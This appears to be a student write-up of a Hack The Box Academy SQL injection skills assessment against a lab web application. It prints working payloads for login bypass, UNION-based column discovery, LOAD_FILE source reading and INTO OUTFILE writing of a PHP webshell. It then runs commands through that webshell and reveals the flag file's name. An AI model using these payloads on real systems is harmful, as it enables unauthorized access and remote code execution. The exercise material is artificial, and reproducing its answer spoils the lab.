# Skills Assessment - SQL Injection Fundamentals  

[Skills Assessment - SQL Injection Fundamentals](https://academy.hackthebox.com/module/33/section/518)  

>The company Inlanefreight has contracted you to perform a web application assessment against one of their public-facing websites. 
>In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities 
>and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.  

>They provided a target IP address and no further information about their website.
>Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.  

## Enumeration  

>WEB Application Target: `94.237.55.149:36332`  

>On the login screen authentication bypass is achieved using SQL injection.  

```
admin' or '1'='1';#--
```  

![sqli-skill-assess-auth-bypass](/images/sqli-skill-assess-auth-bypass.png)  

>The web application has a search function.  

![sqli-skill-assess-site-search](/images/sqli-skill-assess-site-search.png)  

## SQLi Exploitation  

>After determine the search function is vulnerable to sql injection, need to determine the number of columns in sql query of php page:  
>[Union Injection - Detect number of columns - Location of Injection](https://academy.hackthebox.com/module/33/section/216)  

```
search=adam'+UNION+select+1,2,3,4,5--+-
```

>Identified 5 columns.  

>Test the ability to load files and read the source code from php page.  

```
search=adam'+UNION+select+1,2,3,4,LOAD_FILE("/var/www/html/dashboard/dashboard.php")--+-
```  

>Source code of the dashboard.php.  

>Validate if the outfile write permissions are on the user running the web app service.  

```
search=adam'+UNION+select+1,2,3,4,"outfile+success"+into+outfile+"/var/www/html/dashboard/proof.txt"--+-
```  

>Checking if the `proof.txt` file was created and content listed by browsing to [http://94.237.55.149:36332/dashboard/proof.txt](http://94.237.55.149:36332/dashboard/proof.txt)  


## WebShell

>Create a webshell using the outfile function.  [Write Files](https://academy.hackthebox.com/module/33/section/793)  

```
search=adam'+UNION+select+1,2,3,4,"<%3fphp+system($_REQUEST[0])%3b+%3f>"+into+outfile+"/var/www/html/dashboard/webproof.php"--+-
```  

>Validate webshell and remote code execution on the target web server.  

[http://94.237.55.149:36332/dashboard/webproof.php?0=id](http://94.237.55.149:36332/dashboard/webproof.php?0=id)  

## Enumeration via WebShell  

>Using the webshell to perform local Enumeration of the target and locate sensitive flag data.  

```
GET /dashboard/webproof.php?0=ls+../../../.. 
```  

>Located the flag.txt  

```
GET /dashboard/webproof.php?0=cat+../../../../flag_cae1dadcd174.txt
```  

>Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.  

![sqli-skill-assess-webshell](/images/sqli-skill-assess-webshell.png)  
